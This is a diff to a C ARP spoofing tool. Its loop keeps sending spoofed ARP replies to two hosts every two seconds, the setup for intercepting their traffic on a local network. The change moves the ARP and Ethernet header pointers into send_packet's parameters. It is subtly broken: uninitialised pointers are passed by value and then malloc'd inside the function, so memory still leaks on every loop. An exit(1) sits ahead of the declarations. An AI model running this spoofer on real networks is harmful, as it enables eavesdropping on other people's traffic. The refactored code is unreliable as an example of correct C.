@@ -67,27 +67,28 @@ int initialize_inject(const char *gateway_ip, char *target_ip, char *own_ip, con
     exit(1);
     uint32_t target_one_ip;
     uint32_t target_two_ip;
-    
+    struct arp_header *arp_hdr;
+    struct ethernet_header *eth_hdr;
+
     // 1 = broadcast, 0 = spoof 
     int spoof = 0;
     while (1) {
-        send_packet(target_one_ip, my_ip, my_mac, ifname, mac_addr_one, spoof);
-        send_packet(target_two_ip, my_ip, my_mac, ifname, mac_addr_two, spoof); 
+        send_packet(target_one_ip, my_ip, my_mac, ifname, mac_addr_one, spoof, arp_hdr, eth_hdr);
+        send_packet(target_two_ip, my_ip, my_mac, ifname, mac_addr_two, spoof, arp_hdr, eth_hdr); 
         sleep(2);
     }    
     return 0;
 }
 
 int send_packet(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname, 
-                 uint8_t *mac_addr, int get_mac_addr) {
+                uint8_t *mac_addr, int get_mac_addr, struct arp_header *arp_hdr, 
+                struct ethernet_header *eth_hdr) {
     
-    struct arp_header *arp_hdr;
     if (!(arp_hdr = malloc(sizeof(struct arp_header)))) {
         perror("Error in malloc");
         exit(1);
     }
     
-    struct ethernet_header *eth_hdr;
     if (!(eth_hdr = malloc(IP_MAXPACKET))) {
         perror("Error in malloc");
         exit(1);
@@ -151,8 +152,10 @@ int send_packet(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifn
 void get_mac_addr(uint32_t target_ip, uint32_t own_ip, uint8_t *own_mac, char *ifname, uint8_t *mac_addr) {
     
     int get_mac_addr = 1;
-    
-    int sock = send_packet(target_ip, own_ip, own_mac, ifname, mac_addr, get_mac_addr);
+    struct arp_header *arp_hdr;
+    struct ethernet_header *eth_hdr; 
+    int sock = send_packet(target_ip, own_ip, own_mac, ifname, mac_addr, 
+                           get_mac_addr, arp_hdr, eth_hdr);
     
     // For response packet
     char buffer[IP_MAXPACKET];
